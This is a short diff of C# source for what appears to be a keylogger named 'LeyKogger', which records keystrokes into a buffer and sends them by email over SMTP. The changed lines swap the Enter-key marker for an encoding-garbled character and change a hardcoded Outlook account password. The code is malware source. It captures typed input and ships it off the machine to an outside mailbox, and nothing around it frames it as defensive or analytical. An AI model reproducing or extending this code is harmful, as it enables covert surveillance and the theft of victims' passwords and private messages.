@@ -74,7 +74,7 @@ namespace LeyKogger
                 foreach (Keys key in keys)
                 {
                     if (key == Keys.Space) { buffer += " "; continue; }
-                    if (key == Keys.Enter) { buffer += "¶"; continue; }
+                    if (key == Keys.Enter) { buffer += "Â¶"; continue; }
                     if (key == Keys.LButton || key == Keys.RButton || key == Keys.MButton) continue;
 
                     buffer += key.ToString();
@@ -111,7 +111,7 @@ namespace LeyKogger
                 client.EnableSsl = true;
                 client.Port = 587;
                 client.Timeout = 5000;
-                client.Credentials = new NetworkCredential("leykogger@outlook.com", "Key-Logger");
+                client.Credentials = new NetworkCredential("leykogger@outlook.com", "Key!Logger");
                 await client.SendMailAsync(message);
             }
         }
